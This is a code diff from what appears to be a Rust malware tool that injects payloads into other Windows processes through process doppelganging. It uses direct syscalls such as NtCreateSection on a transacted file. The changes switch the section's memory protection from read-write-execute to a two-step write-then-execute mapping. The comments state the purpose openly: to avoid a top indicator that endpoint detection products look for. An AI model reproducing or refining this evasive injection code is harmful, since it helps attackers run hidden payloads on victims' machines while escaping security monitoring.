@@ -57,8 +57,9 @@ const PAGE_READWRITE: u64 = 0x04;
 /// PAGE_EXECUTE_READ.
 const PAGE_EXECUTE_READ: u64 = 0x20;
 
-/// PAGE_EXECUTE_READWRITE.
-const PAGE_EXECUTE_READWRITE: u64 = 0x40;
+/// PAGE_EXECUTE_READ (0x20) and PAGE_READWRITE (0x04) are used for the
+/// two-phase mapping (local RW write → target RX execute) instead of
+/// PAGE_EXECUTE_READWRITE to avoid the top EDR IoC of an RWX section object.
 /// Minimal thread access for injection: THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME | THREAD_QUERY_LIMITED_INFORMATION.
 const THREAD_INJECT_ACCESS: u64 = 0x1A02;
 
@@ -531,13 +532,19 @@ unsafe fn create_section_from_file(file_handle: usize, payload_size: usize) -> R
     let mut large_size: i64 = aligned_size as i64;
     let mut h_section: usize = 0;
 
+    // SectionPageProtection = PAGE_READWRITE.  The payload is written via a
+    // local RW mapping (write_payload_to_section), then mapped into the target
+    // as PAGE_EXECUTE_READ (map_section_to_process).  Using PAGE_READWRITE here
+    // avoids creating an RWX-backed section object — the single most suspicious
+    // NtCreateSection argument for doppelganging detection.  The section object's
+    // maximum protection allows both RW and RX views.
     let status = syscall!(
         "NtCreateSection",
         &mut h_section as *mut _ as u64,               // SectionHandle
         SECTION_ALL_ACCESS,                             // DesiredAccess
         0u64,                                           // ObjectAttributes = NULL
         &mut large_size as *mut _ as u64,               // MaximumSize
-        PAGE_EXECUTE_READWRITE,                         // SectionPageProtection
+        PAGE_READWRITE,                                 // SectionPageProtection
         SEC_COMMIT,                                     // AllocationAttributes
         file_handle as u64,                             // FileHandle (transacted file)
     );
